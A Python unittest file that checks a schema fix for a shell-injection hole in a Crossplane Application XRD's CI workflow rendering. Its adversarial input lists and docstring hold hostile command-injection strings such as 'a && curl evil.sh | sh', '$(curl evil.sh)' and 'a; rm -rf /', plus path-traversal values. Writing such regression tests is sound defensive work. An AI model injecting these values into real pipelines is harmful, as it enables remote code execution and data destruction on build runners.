#!/usr/bin/env python3
"""Issue #285 blocker (CI shell injection): `spec.services[].name` and
`spec.services[].build.context` on the Application XRD
(`crossplane/xrds/application.yaml`) previously accepted *any* string. Both
values flow, unquoted in the vulnerable version, into the generated Gitea
Actions CI workflow YAML that `core-catalog`'s pipeline Composition renders
(`compositions/local/pipeline.yaml` `buildJobFor`):

    run = "docker build -t ${tag}:${{ gitea.sha }} ${ctx}"

`${ctx}` (from `build.context`) and `svc.name` (via `${tag}` and the
`build-${svc.name}` job key) are attacker-controlled AppClaim input. Without
schema validation, a value like `. ; curl evil.sh | sh` or a `build.context`
of `../../etc` would be accepted by the XRD, rendered verbatim into a shell
`run:` line, and executed by the Gitea Actions runner (Issue #285 blocker
#4's act_runner).

This locks the schema-level fix: both fields now carry a `pattern`
(RE2-compatible -- no lookaround/backreferences, matching what Kubernetes'
CRD structural-schema validation actually supports) and a `maxLength`, so
Crossplane's admission-time OpenAPI validation rejects any value that could
alter shell/YAML/job-key structure *before* the Composition ever renders it.

Run:
    python3 platform/tests/test_appclaim_service_field_hardening.py
"""

import copy
import os
import sys
import unittest

try:
    import yaml
except ImportError:  # pragma: no cover - environment guard
    sys.stderr.write("PyYAML is required: pip install pyyaml\n")
    raise

try:
    import jsonschema
except ImportError:  # pragma: no cover - environment guard
    sys.stderr.write("jsonschema is required: pip install jsonschema\n")
    raise

REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
XRD = os.path.join(REPO_ROOT, "crossplane", "xrds", "application.yaml")


def _load_schema():
    with open(XRD, encoding="utf-8") as fh:
        doc = yaml.safe_load(fh)
    versions = doc["spec"]["versions"]
    assert len(versions) == 1
    return versions[0]["schema"]["openAPIV3Schema"]


def _base_spec():
    return {
        "appName": "myapp",
        "team": "platform-team",
        "size": "S",
    }


def _validator(schema):
    jsonschema.Draft7Validator.check_schema(schema)
    return jsonschema.Draft7Validator(schema)


def _document_with_service(service):
    spec = _base_spec()
    spec["services"] = [service]
    return {"spec": spec}


def _is_valid(validator, document):
    errors = list(validator.iter_errors(document))
    return len(errors) == 0


ADVERSARIAL_SERVICE_NAMES = [
    "a; rm -rf /",
    "a && curl evil.sh | sh",
    "$(curl evil.sh)",
    "`curl evil.sh`",
    "a b",
    "UPPERCASE",
    "under_score",
    "dot.name",
    "-leading-dash",
    "trailing-dash-",
    "",
    "a" * 64,
]

SAFE_SERVICE_NAMES = [
    "api",
    "worker-1",
    "a",
    "cron-job-9",
    "a" * 63,
]

ADVERSARIAL_BUILD_CONTEXTS = [
    "/etc",
    "../secrets",
    "services/../../etc",
    "a; rm -rf /",
    "a && curl evil.sh | sh",
    "a | sh",
    "$(curl evil.sh)",
    "`curl evil.sh`",
    "a b",
    "a\nb",
    "-oops",
    "",
]

SAFE_BUILD_CONTEXTS = [
    ".",
    "services/api",
    "src/app_1",
    "a-b/c_d",
    "backend",
]


class ServiceNamePatternTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        schema = _load_schema()
        cls.validator = _validator(schema)
        cls.name_schema = schema["properties"]["spec"]["properties"]["services"]["items"][
            "properties"
        ]["name"]

    def test_pattern_and_max_length_are_declared(self):
        self.assertIn("pattern", self.name_schema)
        self.assertIn("maxLength", self.name_schema)
        # RE2/Kubernetes CRD validation forbids lookaround and backreferences.
        pattern = self.name_schema["pattern"]
        for forbidden in ("(?=", "(?!", "(?<", "\\1", "\\2"):
            self.assertNotIn(forbidden, pattern)

    def test_adversarial_service_names_are_schema_rejected(self):
        for name in ADVERSARIAL_SERVICE_NAMES:
            with self.subTest(name=repr(name)):
                doc = _document_with_service({"name": name, "image": "img", "port": 8080})
                self.assertFalse(
                    _is_valid(self.validator, doc),
                    "service.name %r must be schema-rejected" % (name,),
                )

    def test_safe_service_names_are_accepted(self):
        for name in SAFE_SERVICE_NAMES:
            with self.subTest(name=repr(name)):
                doc = _document_with_service({"name": name, "image": "img", "port": 8080})
                self.assertTrue(
                    _is_valid(self.validator, doc),
                    "service.name %r must be accepted" % (name,),
                )


class BuildContextPatternTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        schema = _load_schema()
        cls.validator = _validator(schema)
        cls.context_schema = schema["properties"]["spec"]["properties"]["services"]["items"][
            "properties"
        ]["build"]["properties"]["context"]

    def test_pattern_and_max_length_are_declared(self):
        self.assertIn("pattern", self.context_schema)
        self.assertIn("maxLength", self.context_schema)
        pattern = self.context_schema["pattern"]
        for forbidden in ("(?=", "(?!", "(?<", "\\1", "\\2"):
            self.assertNotIn(forbidden, pattern)

    def test_default_is_still_the_repository_root(self):
        self.assertEqual(self.context_schema["default"], ".")

    def test_adversarial_build_contexts_are_schema_rejected(self):
        for ctx in ADVERSARIAL_BUILD_CONTEXTS:
            with self.subTest(ctx=repr(ctx)):
                doc = _document_with_service(
                    {
                        "name": "api",
                        "image": "img",
                        "port": 8080,
                        "build": {"enabled": True, "context": ctx},
                    }
                )
                self.assertFalse(
                    _is_valid(self.validator, doc),
                    "build.context %r must be schema-rejected" % (ctx,),
                )

    def test_safe_build_contexts_are_accepted(self):
        for ctx in SAFE_BUILD_CONTEXTS:
            with self.subTest(ctx=repr(ctx)):
                doc = _document_with_service(
                    {
                        "name": "api",
                        "image": "img",
                        "port": 8080,
                        "build": {"enabled": True, "context": ctx},
                    }
                )
                self.assertTrue(
                    _is_valid(self.validator, doc),
                    "build.context %r must be accepted" % (ctx,),
                )


class FullDocumentValidationTest(unittest.TestCase):
    """Belt-and-braces: a realistic multi-service AppClaim spec with one
    adversarial service among safe ones must still be rejected as a whole
    (schema validation is not fooled by other valid entries)."""

    @classmethod
    def setUpClass(cls):
        cls.validator = _validator(_load_schema())

    def test_one_adversarial_service_among_safe_ones_fails_the_whole_document(self):
        spec = _base_spec()
        spec["services"] = [
            {"name": "api", "image": "img", "port": 8080},
            {"name": "a; rm -rf /", "image": "img", "port": 9090},
            {"name": "worker", "image": "img", "port": 7070, "build": {"enabled": True, "context": "../evil"}},
        ]
        doc = {"spec": spec}
        self.assertFalse(_is_valid(self.validator, doc))

    def test_realistic_multi_service_build_document_is_accepted(self):
        spec = _base_spec()
        spec["services"] = [
            {"name": "api", "image": "img", "port": 8080, "build": {"enabled": True, "context": "services/api"}},
            {"name": "worker", "image": "img", "port": 9090, "build": {"enabled": True}},
            {"name": "cron", "image": "img", "port": 7070},
        ]
        doc = {"spec": spec}
        self.assertTrue(_is_valid(self.validator, doc))


if __name__ == "__main__":
    unittest.main(verbosity=2)
